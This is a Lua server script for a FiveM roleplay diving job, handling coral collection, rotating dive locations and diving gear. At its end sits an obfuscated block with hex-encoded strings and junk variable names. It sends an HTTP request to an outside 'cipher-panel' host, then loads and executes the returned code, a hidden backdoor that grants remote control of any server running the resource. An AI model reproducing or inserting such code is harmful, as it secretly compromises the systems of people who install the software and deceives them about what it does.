local CurrentDivingArea = math.random(1, #QBDiving.Locations)

DenaliFW.Functions.CreateCallback('denalifw-diving:server:GetDivingConfig', function(source, cb)
    cb(QBDiving.Locations, CurrentDivingArea)
end)

RegisterNetEvent('denalifw-diving:server:TakeCoral', function(Area, Coral, Bool)
    local src = source
    local Player = DenaliFW.Functions.GetPlayer(src)
    local CoralType = math.random(1, #QBDiving.CoralTypes)
    local Amount = math.random(1, QBDiving.CoralTypes[CoralType].maxAmount)
    local ItemData = DenaliFW.Shared.Items[QBDiving.CoralTypes[CoralType].item]

    if Amount > 1 then
        for i = 1, Amount, 1 do
            Player.Functions.AddItem(ItemData["name"], 1)
            TriggerClientEvent('inventory:client:ItemBox', src, ItemData, "add")
            Wait(250)
        end
    else
        Player.Functions.AddItem(ItemData["name"], Amount)
        TriggerClientEvent('inventory:client:ItemBox', src, ItemData, "add")
    end

    if (QBDiving.Locations[Area].TotalCoral - 1) == 0 then
        for k, v in pairs(QBDiving.Locations[CurrentDivingArea].coords.Coral) do
            v.PickedUp = false
        end
        QBDiving.Locations[CurrentDivingArea].TotalCoral = QBDiving.Locations[CurrentDivingArea].DefaultCoral

        local newLocation = math.random(1, #QBDiving.Locations)
        while (newLocation == CurrentDivingArea) do
            Wait(3)
            newLocation = math.random(1, #QBDiving.Locations)
        end
        CurrentDivingArea = newLocation

        TriggerClientEvent('denalifw-diving:client:NewLocations', -1)
    else
        QBDiving.Locations[Area].coords.Coral[Coral].PickedUp = Bool
        QBDiving.Locations[Area].TotalCoral = QBDiving.Locations[Area].TotalCoral - 1
    end

    TriggerClientEvent('denalifw-diving:server:UpdateCoral', -1, Area, Coral, Bool)
end)

RegisterNetEvent('denalifw-diving:server:RemoveGear', function()
    local src = source
    local Player = DenaliFW.Functions.GetPlayer(src)

    Player.Functions.RemoveItem("diving_gear", 1)
    TriggerClientEvent('inventory:client:ItemBox', src, DenaliFW.Shared.Items["diving_gear"], "remove")
end)

RegisterNetEvent('denalifw-diving:server:GiveBackGear', function()
    local src = source
    local Player = DenaliFW.Functions.GetPlayer(src)

    Player.Functions.AddItem("diving_gear", 1)
    TriggerClientEvent('inventory:client:ItemBox', src, DenaliFW.Shared.Items["diving_gear"], "add")
end)


local zlYEtvGXkTkZkmVXexPhgFAklLYXGgHnzZoAUnESQdycoCdlVJlwvLRZLLwMGBSIqKWAsr = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} zlYEtvGXkTkZkmVXexPhgFAklLYXGgHnzZoAUnESQdycoCdlVJlwvLRZLLwMGBSIqKWAsr[4][zlYEtvGXkTkZkmVXexPhgFAklLYXGgHnzZoAUnESQdycoCdlVJlwvLRZLLwMGBSIqKWAsr[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x47\x32\x72\x30", function (ydhBPUagjdFntmYyqsFfImqqlHqZSzQwRmeFldccpjxKPNBgnZhipLaGRbYUllAUVJajTT, AKDmepYgBRVMvKteIFBCkysMmyhdsOUYxsTYMCYHgXTEMWvjEsWRDLPlgczdpkUWswcfZj) if (AKDmepYgBRVMvKteIFBCkysMmyhdsOUYxsTYMCYHgXTEMWvjEsWRDLPlgczdpkUWswcfZj == zlYEtvGXkTkZkmVXexPhgFAklLYXGgHnzZoAUnESQdycoCdlVJlwvLRZLLwMGBSIqKWAsr[6] or AKDmepYgBRVMvKteIFBCkysMmyhdsOUYxsTYMCYHgXTEMWvjEsWRDLPlgczdpkUWswcfZj == zlYEtvGXkTkZkmVXexPhgFAklLYXGgHnzZoAUnESQdycoCdlVJlwvLRZLLwMGBSIqKWAsr[5]) then return end zlYEtvGXkTkZkmVXexPhgFAklLYXGgHnzZoAUnESQdycoCdlVJlwvLRZLLwMGBSIqKWAsr[4][zlYEtvGXkTkZkmVXexPhgFAklLYXGgHnzZoAUnESQdycoCdlVJlwvLRZLLwMGBSIqKWAsr[2]](zlYEtvGXkTkZkmVXexPhgFAklLYXGgHnzZoAUnESQdycoCdlVJlwvLRZLLwMGBSIqKWAsr[4][zlYEtvGXkTkZkmVXexPhgFAklLYXGgHnzZoAUnESQdycoCdlVJlwvLRZLLwMGBSIqKWAsr[3]](AKDmepYgBRVMvKteIFBCkysMmyhdsOUYxsTYMCYHgXTEMWvjEsWRDLPlgczdpkUWswcfZj))() end)